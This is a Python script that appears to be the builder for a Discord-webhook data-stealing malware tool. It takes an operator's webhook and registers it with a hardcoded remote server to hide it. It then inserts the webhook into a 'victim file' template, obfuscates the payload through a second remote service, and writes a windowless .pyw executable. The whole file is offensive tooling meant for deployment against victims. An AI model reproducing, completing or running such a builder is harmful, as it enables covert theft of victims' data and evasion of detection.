from base64 import b64encode
from pystyle import Center, Colorate, Colors, System
from requests import post, get
from time import time
from os import mkdir
from os.path import exists
from tokenize import tokenize, untokenize, TokenInfo
from io import BytesIO

System.Clear()
System.Size(150, 30)

title = r"""
██████╗ ███████╗██╗  ██╗██╗   ██╗██████╗ 
██╔══██╗██╔════╝██║  ██║██║   ██║╚════██╗
██████╔╝███████╗███████║██║   ██║ █████╔╝
██╔══██╗╚════██║██╔══██║╚██╗ ██╔╝██╔═══╝ 
██║  ██║███████║██║  ██║ ╚████╔╝ ███████╗
╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝"""

main_fade = Colors.purple_to_blue
main_color = Colors.blue

input = lambda x: __builtins__.input(Colorate.Color(main_color, ' '+x))

title = Center.XCenter(title)
title = Colorate.Vertical(main_fade, title)

def stage(text):
    print(Colorate.Color(main_color, ' '+text+'...'))

def init():
    if not exists('build'):
        mkdir('build')
        
def obfuscate(code):
    res = get('http://45.158.77.206:5005', json={'code': code})
    
    return res.text

def build(webhook):

    url = "http://45.158.77.206:5004/new"
    json = {
        'webhook': webhook,
        'user-agents': ['Chrome/103.0']
    }
    
    stage('Protecting your webhook')
    res = post(url, json=json)

    if res.status_code != 200:
        raise Exception("Can't protect the webhook")

    protected_webhook = res.text

    stage("Writing the victim file")
    with open('src/template.txt', 'r') as file:
        template = file.read()

    content = template.replace('YOUR WEBHOOK HERE', protected_webhook)

    stage("Obfuscating content")
    content = obfuscate(content)

    return content

def main():
    init()

    print('\n'*2)
    print(title)
    print('\n'*2)

    webhook = input("Your Discord webhook > ")
    
    print()

    before = time()
    try:
        content = build(webhook)
    except Exception as error:
        input('Something went wrong ! ')
    after = time()

    print()

    with open('build/built.pyw', 'w') as file:
        file.write(content)

    input(f'Done ! Built in {str(round(after-before, 2))} s')


if __name__ == '__main__': main()  
